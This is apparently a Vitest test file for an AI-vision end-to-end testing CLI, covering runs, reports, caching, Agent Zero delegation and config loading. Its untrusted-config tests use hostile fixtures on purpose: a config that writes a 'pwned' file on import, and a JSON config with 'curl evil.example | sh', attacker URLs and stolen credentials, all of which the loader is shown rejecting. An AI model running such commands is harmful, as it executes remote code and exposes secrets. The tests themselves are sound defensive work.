import { describe, expect, it } from 'vitest'
import { mkdtemp, mkdir, readFile, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'

import { main } from '../../src/cli.js'
import { VisionClient } from '../../src/engine/loop.js'
import { CallCost, CallKind } from '../../src/vision/cost.js'
import { JsonSchema, Message } from '../../src/vision/openrouter.js'
import { ProviderRules } from '../../src/config.js'

const FIXTURE_URL = `file://${fileURLToPath(new URL('../fixtures/index.html', import.meta.url))}`

class StubClient implements VisionClient {
  calls: { kind: CallKind; model: string }[] = []
  private queue: { content: string }[]

  constructor(queue: { content: string }[]) {
    this.queue = [...queue]
  }

  async complete(opts: {
    model: string
    messages: Message[]
    schema?: JsonSchema
    escalationModels?: string[]
    provider?: ProviderRules
    kind?: CallKind
  }): Promise<{ id: string; content: string; cost: CallCost; model: string }> {
    const next = this.queue.shift()
    if (!next) throw new Error('stub client queue empty')
    this.calls.push({ kind: opts.kind ?? 'ground', model: opts.model })
    const cost: CallCost = {
      model: opts.model,
      provider: 'stub',
      tokens: 10,
      costUsd: 0.001,
      kind: opts.kind ?? 'ground',
    }
    return { id: `stub-${this.calls.length}`, content: next.content, model: opts.model, cost }
  }
}

interface Captured {
  lines: string[]
  fn: (line: string) => void
}

function capture(): Captured {
  const lines: string[] = []
  return { lines, fn: (line) => lines.push(line) }
}

describe('argus-reviewer CLI', () => {
  it('record --help and run --help exit 0', async () => {
    const out = capture()
    expect(await main(['record', '--help'], { out: out.fn })).toBe(0)
    expect(await main(['run', '--help'], { out: out.fn })).toBe(0)
    expect(await main(['--help'], { out: out.fn })).toBe(0)
    expect(out.lines.join('\n')).toContain('argus-reviewer run')
    expect(out.lines.join('\n')).toContain('argus-reviewer record')
  })

  it('record rejects a non-positive-integer --max-steps before launching', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-maxsteps-'))
    const out = capture()
    const err = capture()
    for (const bad of ['0', '-3', '1.5', 'abc']) {
      const code = await main(
        ['record', 'click the thing', '--url', FIXTURE_URL, `--max-steps=${bad}`],
        { cwd, out: out.fn, err: err.fn },
      )
      expect(code).toBe(2)
    }
    expect(err.lines.join('\n')).toContain('--max-steps must be a positive integer')
  })

  it('runs a td-API test file end-to-end, warns on unknown provider slugs, writes JUnit + report', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cli-'))
    const testsDir = join(cwd, 'tests')
    const cacheDir = join(cwd, 'cache')
    const reportDir = join(cwd, 'report')
    await mkdir(testsDir, { recursive: true })

    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        cacheDir,
        reportDir,
        budgetUsd: 1,
        provider: { ignore: ['siliconflow', 'nonexistent-provider'] },
      }),
    )

    // Plain-TS test using the td DSL — globals `test`/`td` injected by `run`.
    await writeFile(
      join(testsDir, 'landing.test.ts'),
      `test('fixture click flow', async (td) => {
  await td.find('the "Click me" button').click()
  const ok = await td.assert('the marker shows clicked')
  if (ok.verdict !== 'pass') throw new Error(ok.reasoning)
})
`,
    )

    const client = new StubClient([
      { content: JSON.stringify({ action: 'click', x: 200, y: 130, reasoning: 'the button' }) },
      { content: JSON.stringify({ verdict: 'pass', reasoning: 'marker reads clicked' }) },
    ])

    const out = capture()
    const err = capture()
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: out.fn,
      err: err.fn,
      createClient: () => client,
      env: { ...process.env, OPENROUTER_API_KEY: 'test-key' },
    })

    expect(code).toBe(0)
    expect(err.lines.join('\n')).toContain('unknown provider slug "nonexistent-provider"')
    expect(out.lines.join('\n')).toContain('PASS fixture click flow')
    expect(client.calls.length).toBe(2)

    const junit = await readFile(join(reportDir, 'junit.xml'), 'utf8')
    expect(junit).toContain('name="fixture click flow"')
    expect(junit).toMatch(/time="\d+\.\d{3}"/)
    expect(junit).not.toContain('<failure')

    const report = JSON.parse(await readFile(join(reportDir, 'run.json'), 'utf8')) as {
      ok: boolean
      totals: { passed: number; failed: number; visionCalls: number; visionCostUsd: number }
      tests: { name: string; ok: boolean; asserts: { verdict: string }[] }[]
    }
    expect(report.ok).toBe(true)
    expect(report.totals.passed).toBe(1)
    expect(report.totals.failed).toBe(0)
    expect(report.totals.visionCalls).toBe(2)
    expect(report.totals.visionCostUsd).toBeCloseTo(0.002)
    expect(report.tests[0]!.asserts[0]!.verdict).toBe('pass')

    // The locate call wrote a fingerprint cache entry for the test flow.
    const cache = JSON.parse(
      await readFile(join(cacheDir, 'landing__fixture-click-flow.json'), 'utf8'),
    ) as { steps: { instruction: string; action: { action: string } }[] }
    expect(cache.steps.length).toBe(1)
    expect(cache.steps[0]!.action.action).toBe('click')
  }, 60_000)

  it('marks the run failed when an assertion fails', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cli-fail-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({ testsDir, reportDir: join(cwd, 'report'), budgetUsd: 1 }),
    )
    await writeFile(
      join(testsDir, 'failing.test.mjs'),
      `test('failing assert', async (td) => {
  await td.assert('an element that does not exist is visible')
})
`,
    )
    const client = new StubClient([
      { content: JSON.stringify({ verdict: 'fail', reasoning: 'no such element on screen' }) },
    ])
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: capture().fn,
      err: capture().fn,
      createClient: () => client,
    })
    expect(code).toBe(1)
    const junit = await readFile(join(cwd, 'report', 'junit.xml'), 'utf8')
    expect(junit).toContain('<failure')
    expect(junit).toContain('failing assert')
  }, 60_000)

  it('invokes config pageSetup with the page before navigation', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-setup-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })

    // pageSetup receives the Playwright page; assert it fires pre-navigation
    // (url is still about:blank) and records a marker we can observe.
    await writeFile(
      join(cwd, 'setup.mjs'),
      `export default async function setup(page) {
  if (page.url() !== 'about:blank') throw new Error('pageSetup ran after navigation')
  globalThis.__pageSetupCalls = (globalThis.__pageSetupCalls || 0) + 1
  await page.addInitScript('globalThis.__seeded = true')
}
`,
    )
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        reportDir: join(cwd, 'report'),
        pageSetup: './setup.mjs',
        budgetUsd: 1,
      }),
    )
    await writeFile(
      join(testsDir, 'noop.test.mjs'),
      `test('noop', async () => {})
`,
    )
    const client = new StubClient([])
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: capture().fn,
      err: capture().fn,
      createClient: () => client,
    })
    expect(code).toBe(0)
    expect((globalThis as Record<string, unknown>).__pageSetupCalls).toBe(1)
  }, 60_000)

  it('cache list and prune operate on the cache dir', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cache-'))
    const cacheDir = join(cwd, 'cache')
    await mkdir(cacheDir, { recursive: true })
    await writeFile(join(cacheDir, 'flow-a.json'), JSON.stringify({ steps: [] }))
    await writeFile(join(cwd, 'argus-reviewer.config.json'), JSON.stringify({ cacheDir }))
    const out = capture()
    expect(await main(['cache', 'list'], { cwd, out: out.fn })).toBe(0)
    expect(out.lines.join('\n')).toContain('flow-a: 0 steps')
    expect(await main(['cache', 'prune', 'flow-a'], { cwd, out: out.fn })).toBe(0)
    expect(await main(['cache', 'list'], { cwd, out: out.fn })).toBe(0)
    expect(out.lines.join('\n')).toContain('cache empty')
  })

  it('delegate forwards the task to a0 headless with the resolved host', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-delegate-'))
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({ a0: { url: 'https://a0.example.com' } }),
    )
    const seen: { args?: string[] } = {}
    const code = await main(['delegate', 'click through the signup flow', '--url', 'http://app.local'], {
      cwd,
      out: capture().fn,
      err: capture().fn,
      exec: async (_cmd, args) => {
        seen.args = args
        return { code: 0, stdout: 'signup flow works\n', stderr: '' }
      },
    })
    expect(code).toBe(0)
    expect(seen.args?.[0]).toBe('headless')
    expect(seen.args).toContain('https://a0.example.com')
    const prompt = seen.args?.at(-1) ?? ''
    expect(prompt).toContain('click through the signup flow')
    expect(prompt).toContain('http://app.local')
  })

  it('delegate exits 2 without a task and non-zero when a0 fails', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-delegate-'))
    const exec = async () => ({ code: 1, stdout: '', stderr: 'connection refused' })
    expect(await main(['delegate'], { cwd, out: capture().fn, err: capture().fn, exec })).toBe(2)
    expect(await main(['delegate', 'task'], { cwd, out: capture().fn, err: capture().fn, exec })).toBe(1)
  })

  it('run with heal:a0 delegates each failed test to Agent Zero', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-heal-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        reportDir: join(cwd, 'report'),
        budgetUsd: 1,
        heal: 'a0',
        a0: { url: 'https://a0.example.com' },
      }),
    )
    await writeFile(
      join(testsDir, 'failing.test.mjs'),
      `test('failing assert', async (td) => {
  await td.assert('an element that does not exist is visible')
})
`,
    )
    const client = new StubClient([
      { content: JSON.stringify({ verdict: 'fail', reasoning: 'no such element on screen' }) },
    ])
    const delegated: string[] = []
    const out = capture()
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: out.fn,
      err: capture().fn,
      createClient: () => client,
      exec: async (_cmd, args) => {
        if (args[0] === 'headless') {
          delegated.push(args.at(-1) ?? '')
          return { code: 0, stdout: 'the app is broken: no marker rendered', stderr: '' }
        }
        return { code: 1, stdout: '', stderr: 'unauthenticated' } // gh auth status
      },
    })
    expect(code).toBe(1)
    expect(delegated.length).toBe(1)
    expect(delegated[0]).toContain('failing assert')
    expect(delegated[0]).toContain(FIXTURE_URL)
    expect(out.lines.join('\n')).toContain('a0 diagnosis')
    const report = JSON.parse(
      await readFile(join(cwd, 'report', 'run.json'), 'utf8'),
    ) as { tests: { a0Diagnosis?: string }[] }
    expect(report.tests[0]!.a0Diagnosis).toBe('the app is broken: no marker rendered')
  }, 60_000)

  it('init reports the environment and enables heal:a0 when Agent Zero resolves', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-init-'))
    const out = capture()
    const code = await main(['init'], {
      cwd,
      out: out.fn,
      err: capture().fn,
      env: { ...process.env, AGENT_ZERO_HOST: 'https://a0.example.com' },
      exec: async (cmd) =>
        cmd === 'a0'
          ? { code: 0, stdout: '2.12\n', stderr: '' }
          : { code: 1, stdout: '', stderr: 'unauthenticated' },
    })
    expect(code).toBe(0)
    const text = out.lines.join('\n')
    expect(text).toContain('argus-reviewer environment')
    expect(text).toContain('a0 2.12 → https://a0.example.com')
    const config = await readFile(join(cwd, 'argus-reviewer.config.ts'), 'utf8')
    expect(config).toContain("heal: 'a0'")
    expect(config).toContain("https://a0.example.com")
  })

  it('init scaffolds config, smoke test, and workflow; skips existing files', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-init-'))
    const out = capture()
    expect(await main(['init'], { cwd, out: out.fn })).toBe(0)
    const { existsSync } = await import('node:fs')
    expect(existsSync(join(cwd, 'argus-reviewer.config.ts'))).toBe(true)
    expect(existsSync(join(cwd, 'tests/argus/smoke.test.ts'))).toBe(true)
    expect(existsSync(join(cwd, '.github/workflows/argus-reviewer.yml'))).toBe(true)
    // Second run without --force skips rather than overwriting
    const out2 = capture()
    expect(await main(['init'], { cwd, out: out2.fn })).toBe(0)
    expect(out2.lines.join('\n')).toContain('exists, skipping')
  })
})

describe('loadConfig', () => {
  it('loads a TypeScript config via transpile fallback', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    await writeFile(
      join(cwd, 'argus-reviewer.config.ts'),
      `export default { model: 'test/model', budgetUsd: 0.5 } satisfies import('../../src/config.js').ConfigInput
`,
    )
    const config = await loadConfig(cwd, { trust: 'trusted' })
    expect(config.model).toBe('test/model')
    expect(config.budgetUsd).toBe(0.5)
  })

  it('loads a TypeScript config inside a CommonJS consumer package', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    // `npm init -y` default — no type field means CommonJS, which makes Node's
    // native .ts import treat the config as CJS and reject `export default`.
    await writeFile(join(cwd, 'package.json'), JSON.stringify({ name: 'consumer' }))
    await writeFile(
      join(cwd, 'argus-reviewer.config.ts'),
      `export default { model: 'cjs/model' }\n`,
    )
    expect((await loadConfig(cwd, { trust: 'trusted' })).model).toBe('cjs/model')
  })

  it('still loads a legacy vision-e2e.config.json', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    await writeFile(join(cwd, 'vision-e2e.config.json'), JSON.stringify({ model: 'legacy/model' }))
    expect((await loadConfig(cwd, { trust: 'trusted' })).model).toBe('legacy/model')
  })

  it('untrusted: a .ts config is never transpiled or imported', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    // A hostile config proves execution by writing a sentinel on import.
    await writeFile(
      join(cwd, 'argus-reviewer.config.ts'),
      `import { writeFileSync } from 'node:fs'
writeFileSync('${join(cwd, 'pwned')}', 'x')
export default { model: 'hostile/model' }
`,
    )
    const notes: string[] = []
    const config = await loadConfig(cwd, { trust: 'untrusted', note: (l) => notes.push(l) })
    expect(config.model).not.toBe('hostile/model')
    expect(notes.join('\n')).toContain('ignored')
    await expect(readFile(join(cwd, 'pwned'))).rejects.toThrow()
  })

  it('untrusted: a hostile .ts cannot shadow a committed .json config', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    await writeFile(join(cwd, 'argus-reviewer.config.json'), JSON.stringify({ model: 'safe/model' }))
    await writeFile(
      join(cwd, 'argus-reviewer.config.ts'),
      `export default { model: 'hostile/model' }\n`,
    )
    // .ts is preferred on trusted loads — this is the shadowing the gate prevents.
    expect((await loadConfig(cwd, { trust: 'trusted' })).model).toBe('hostile/model')
    const notes: string[] = []
    const config = await loadConfig(cwd, { trust: 'untrusted', note: (l) => notes.push(l) })
    // The .json is loaded but allowlist-filtered — `model` isn't allowlisted,
    // so it falls back to the default rather than either file's value.
    expect(config.model).toBe('google/gemini-2.5-flash-lite')
    expect(notes.join('\n')).toContain('ignored')
  })

  it('untrusted: JSON config is reduced to the allowlist', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        model: 'expensive/model',
        code_model: 'expensive/code',
        provider: { only: ['malicious-provider'] },
        openrouter: { headers: { Authorization: 'Bearer attacker' } },
        severity: [],
        codeReviewBudgetUsd: 0,
        budgetUsd: 0.0001,
        target: { command: 'curl evil.example | sh', url: 'https://attacker.example', readyTimeoutMs: 1 },
        pageSetup: './steal-env.js',
        testsDir: './pr-controlled-tests',
        sandbox: { enabled: true, image: 'attacker/image' },
        secrets: { OPENROUTER_API_KEY: 'hunter2' },
        cacheDir: '/tmp/evil',
        indexPath: '/tmp/evil.json',
        reportDir: '/tmp/evil-reports',
        a0: { url: 'https://attacker.example' },
        heal: 'a0',
        logLevel: 'debug',
        sourceGlobs: ['src/**'],
      }),
    )
    const config = await loadConfig(cwd, { trust: 'untrusted' })
    // Allowlisted fields survive.
    expect(config.logLevel).toBe('debug')
    expect(config.sourceGlobs).toEqual(['src/**'])
    // Everything else falls back to defaults — no field the PR controls
    // may shape its own review, spend, endpoints, or write locations.
    expect(config.model).not.toBe('expensive/model')
    expect(config.code_model).not.toBe('expensive/code')
    expect(config.provider.only).toBeUndefined()
    expect(config.openrouter).toBeUndefined()
    expect(config.severity).toEqual(['bug'])
    expect(config.codeReviewBudgetUsd).toBeUndefined()
    expect(config.budgetUsd).toBeUndefined()
    expect(config.target).toBeUndefined()
    expect(config.pageSetup).toBeUndefined()
    expect(config.testsDir).toBeUndefined()
    expect(config.sandbox.enabled).toBe(false)
    expect(config.sandbox.image).toBeUndefined()
    expect(config.secrets).toBeUndefined()
    expect(config.cacheDir).toBeUndefined()
    expect(config.indexPath).toBeUndefined()
    expect(config.reportDir).toBeUndefined()
    expect(config.a0).toBeUndefined()
    expect(config.heal).toBe('local')
  })

  it('untrusted: same allowlist applies to legacy vision-e2e.config.json', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    await writeFile(
      join(cwd, 'vision-e2e.config.json'),
      JSON.stringify({ model: 'hostile/model', logLevel: 'error' }),
    )
    const config = await loadConfig(cwd, { trust: 'untrusted' })
    expect(config.model).not.toBe('hostile/model')
    expect(config.logLevel).toBe('error')
  })
})
